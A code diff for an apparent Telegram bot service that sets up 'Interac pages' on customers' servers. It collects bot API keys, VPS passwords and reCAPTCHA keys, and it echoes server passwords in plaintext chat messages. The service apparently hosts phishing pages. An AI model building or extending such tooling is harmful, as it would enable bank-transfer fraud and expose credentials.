@@ -67,33 +67,72 @@ function calculateEndDate(duration) {
 async function dashboard(userId){
     try{
         const user = await getUserById(userId);
-        console.log(user)
         const userSubscription = await getSubscriptionsByUserId(userId);
-        console.log(userSubscription)
+        const activeSubscription = userSubscription.find(sub => sub.status === 'Active');
+
         let message = `🌟 User Dashboard 🌟\n`;
-        message += `Hello! Here's a quick overview of your account details and subscription status:\n\n🔑 User ID: ${user.userid}\n\n🌐 Domain: ${user.domain || ''}\n\n🛠️ API Keys: ${user.apikeys || ''}\n`;
+        message += `Hello! Here's a quick overview of your account details and subscription status:\n\n🔑 User ID: ${user.userid}\n\n🌐 Domain: ${user.domain || ''}\n\n🛠️ API Keys: ${user.apikeys || ''}\n\nVPS IP: ${user.vpsip}\n\nVPS Password: ${user.vpspassword}\n\n`;
         message += `📆 Subscription Details:\n\n`;
-        message += `Subscription ID: ${userSubscription.subscriptionid}\nEnd Date: ${formatDate(userSubscription.enddate)}\nStatus: ${userSubscription.status} 🎉\n`;
+        message += `Subscription ID: ${activeSubscription.subscriptionid}\nEnd Date: ${formatDate(activeSubscription.enddate)}\nStatus: ${activeSubscription.status} 🎉\n\n`;
         message += `Quick Actions:\n\n`
         message += `🔄 Create a page - /create\n\nFor any assistance, contact @webcro_help to find out more about what you can do!`;
         
         return{success:true, message:message}
     }catch(error){
         console.error('Error fetching user information:', error);
-        return {success: false, message:"An errir occurred while fetching user information."}
+        return {success: false, message:"An error occurred while fetching user information."}
     }
     
 }
 
-// Placeholder function for processing payment
-async function processPayment(userId, amount) {
-    // Implement payment processing logic
-    // This could interact with an external payment gateway
-    return true; // Simulate successful payment
+async function setUserInfoForCreatingPage(msg, chatId){
+    try{
+        
+        const data = msg.text.split(',');
+        if (data.length === 5) {
+            const user = await getUserById(chatId);
+            const info = {
+                apiKey: data[0].trim(),
+                vpsIp: data[1].trim(),
+                vpsPassword: data[2].trim(),
+                RECAPTCHA_SECRET_KEY: data[3].trim(),
+                RECAPTCHA_SITE_KEY: data[4].trim()
+            }
+
+            user.apiKeys = info.apiKey;
+            user.vpsip = info.vpsIp;
+            user.vpspassword = info.vpsPassword;
+            
+            await updateUser(chatId, user)
+            
+    
+            return {success:true, message: 'Thank you for the information. We will proceed with the setup.\n\nWait for the domain to appear.', info: info}
+        }
+
+    } catch(error) {
+        console.error('Error fetching user information:', error);
+        return {success: false, message:"An error occurred while fetching user information."}
+    }
+}
+
+async function createPage(){
+    try{
+        let message = `🔐Information Request🔐\n\n***Currently, we have the Interac page available for you. Our team is working hard to bring more pages very soon. Stay tuned for exciting updates!***\n\n`;
+        message += `To set up the page, we need a few details. Please reply with the following information:\n`;
+        message += `1. Telegram Bot API Key\n2. VPS IP Address\n3. VPS Password\n4. RECAPTCHA SECRET KEY\n5. RECAPTCHA SITE KEY\n\n`;
+        message += `Reply in the format: \`API_KEY, IP_ADDRESS, PASSWORD, RECAPTCHA_SECRET_KEY, RECAPTCHA_SITE_KEY\``;
+
+        return {success:true, message:message};
+    } catch(error){
+        console.error('Error fetching user information:', error);
+        return {success: false, message:"An error occurred while fetching user information."}
+    }
 }
 
 module.exports = {
     handleNewSubscription,
     getUserSubscriptionStatus,
-    dashboard
+    dashboard,
+    createPage,
+    setUserInfoForCreatingPage
 };
